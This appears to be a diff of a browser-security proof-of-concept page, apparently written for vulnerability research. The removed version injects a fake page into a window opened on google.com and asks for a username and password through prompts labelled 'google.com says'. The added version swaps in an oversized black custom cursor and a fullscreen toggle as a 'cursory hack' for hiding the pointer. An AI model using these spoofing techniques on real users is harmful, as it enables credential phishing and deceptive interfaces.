@@ -1,141 +1,183 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Browser Security Demo</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html, body {
-      width: 100%;
-      height: 100%;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    }
-
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      gap: 30px;
-      padding: 20px;
-    }
-
-    .container {
-      background: white;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-      max-width: 600px;
-      text-align: center;
-    }
-
-    h1 {
-      color: #333;
-      margin-bottom: 20px;
-      font-size: 28px;
-    }
-
-    .warning {
-      background: #fff3cd;
-      border: 2px solid #ffc107;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 20px 0;
-      color: #856404;
-    }
-
-    .demo-button {
-      padding: 15px 30px;
-      font-size: 18px;
-      border-radius: 8px;
-      background-color: #667eea;
-      color: white;
-      border: none;
-      cursor: pointer;
-      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
-      transition: all 0.3s ease;
-      margin: 10px;
-    }
-
-    .demo-button:hover {
-      background-color: #5568d3;
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
-    }
-
-    .info {
-      background: #e7f3ff;
-      border-left: 4px solid #2196F3;
-      padding: 15px;
-      margin: 20px 0;
-      text-align: left;
-    }
-
-    .flag-hunt {
-      background: #f0f0f0;
-      padding: 20px;
-      border-radius: 8px;
-      margin-top: 20px;
-      font-family: monospace;
-    }
-
-    code {
-      background: #f4f4f4;
-      padding: 2px 6px;
-      border-radius: 3px;
-      font-family: monospace;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>🔒 Browser Security Demonstration</h1>
-    
-
-
-    <button class="demo-button" onclick="safeDemo()">POC</button>
-
-    <div class="flag-hunt">
-      <strong>Address-bar disappearance leads to originless dialogs</strong><br>
-    </div>
-  </div>
-
-  <script>
-    function safeDemo() {
-      // Open a new window
-      let win = window.open("https://www.google.com/", "_blank");
+<html><head>
+    <meta charset="utf-8">
+    <title>cursory hack</title>
+    <style media="screen">
+      body {
+        height:100vh;
+        margin: 0px;
+        background: #fff;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+      }
       
-      // Attempt to write content (will be blocked by modern browsers for cross-origin)
-      setTimeout(() => {
-        try {
-win.document.write(`
-  <h1>This is not Google!</h1>
-  <button id="btn">Click me</button>
+      #fullscreenBtn {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 15px 30px;
+        font-size: 18px;
+        font-weight: bold;
+        background: #ff0064;
+        color: white;
+        border: 3px solid #ff0064;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        z-index: 1000;
+      }
+      
+      #fullscreenBtn:hover {
+        background: #cc0050;
+        border-color: #cc0050;
+        transform: translate(-50%, -50%) scale(1.05);
+      }
+      
+      /* Mobile cursor box - hidden by default */
+      #mobileCursor {
+        position: fixed;
+        width: 128px;
+        height: 128px;
+        background: rgba(0, 0, 0, 0.95);
+        pointer-events: none;
+        z-index: 999;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        display: none;
+        transform: translate(-50%, -50%);
+      }
+      
+      #mobileCursor.active {
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <button id="fullscreenBtn">Enter Fullscreen</button>
+    
+    <p style="font-size: 2em; font-weight: bold; text-align: center;">
+      Hello! Move the cursor ....
+    </p>
+    
+    <!-- Mobile cursor box -->
+    <div id="mobileCursor"></div>
+   
+    <script type="text/javascript">
+      var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      
+      // Create larger canvas for bigger cursor (desktop only)
+      var canvas = document.createElement('canvas')
+      canvas.width = canvas.height = 128
 
-  <script>
-    // use addEventListener instead of inline onclick
-    document.getElementById('btn').addEventListener('click', function() {
-      const username = prompt("google.com says\\nWhat's your name?");
-      const password = prompt("google.com says\\nWhat's your password?");
-      alert('Your credential:\\nUsername: ' + username + '\\nPassword: ' + password);
-    });
-  <\/script>
-`);
-          win.document.close();
-          console.log("✅ Content injection succeeded (about:blank only)");
-        } catch (e) {
-          console.warn("Blocked by browser protections:", e);
-          alert("Browser security blocked the injection (this is good!)");
+      var ctx = canvas.getContext('2d')
+      ctx.fillStyle = 'rgba(0,0,0,0.95)'
+      ctx.strokeStyle = 'rgba(0,0,0,0.7)'
+
+      var cx, cy, x, y, animation
+      var mobileCursor = document.getElementById('mobileCursor');
+      var cursorActive = false;
+
+      // Desktop: mousemove
+      if (!isMobile) {
+        document.body.addEventListener('mousemove', function(e){
+          cx = e.clientX
+          cy = e.clientY
+          x = cx / window.innerWidth
+          y = cy / window.innerHeight
+
+          if(!animation) animation = requestAnimationFrame(animate)
+        })
+
+        function animate(time){
+          animation = null
+
+          ctx.clearRect(0,0,128,128)
+          ctx.save()
+          
+          // Draw very large black rectangle
+          ctx.fillRect(0, 0, 128, 128);
+          
+          ctx.restore()
+
+          var url = canvas.toDataURL()
+
+          // Position cursor at top (hotspot at 0, 0)
+          document.body.style.cursor = 'url(' + url + ') 0 0, crosshair'
         }
-      }, 50);
-    }
-  </script>
-</body>
-</html>
+      } else {
+        // Mobile: show cursor on first touch/click
+        document.body.style.cursor = 'none';
+        
+        function showMobileCursor(e) {
+          if (!cursorActive) {
+            cursorActive = true;
+            mobileCursor.classList.add('active');
+          }
+          
+          var touch = e.touches ? e.touches[0] : e;
+          mobileCursor.style.left = touch.clientX + 'px';
+          mobileCursor.style.top = touch.clientY + 'px';
+        }
+        
+        // Activate on first click/touch
+        document.body.addEventListener('click', function(e) {
+          if (!cursorActive) {
+            showMobileCursor(e);
+          }
+        });
+        
+        document.body.addEventListener('touchstart', function(e) {
+          showMobileCursor(e);
+        });
+        
+        // Follow touch movement
+        document.body.addEventListener('touchmove', function(e) {
+          if (cursorActive) {
+            var touch = e.touches[0];
+            mobileCursor.style.left = touch.clientX + 'px';
+            mobileCursor.style.top = touch.clientY + 'px';
+          }
+        });
+      }
+
+      // Fullscreen functionality
+      document.getElementById('fullscreenBtn').addEventListener('click', function() {
+        var elem = document.documentElement;
+        
+        if (!document.fullscreenElement) {
+          if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+          } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen();
+          } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+          }
+          this.textContent = 'Exit Fullscreen';
+        } else {
+          if (document.exitFullscreen) {
+            document.exitFullscreen();
+          } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+          } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+          }
+          this.textContent = 'Enter Fullscreen';
+        }
+      });
+
+      document.addEventListener('fullscreenchange', function() {
+        var btn = document.getElementById('fullscreenBtn');
+        if (document.fullscreenElement) {
+          btn.textContent = 'Exit Fullscreen';
+        } else {
+          btn.textContent = 'Enter Fullscreen';
+        }
+      });
+
+    </script>
+  
+
+</body></html>
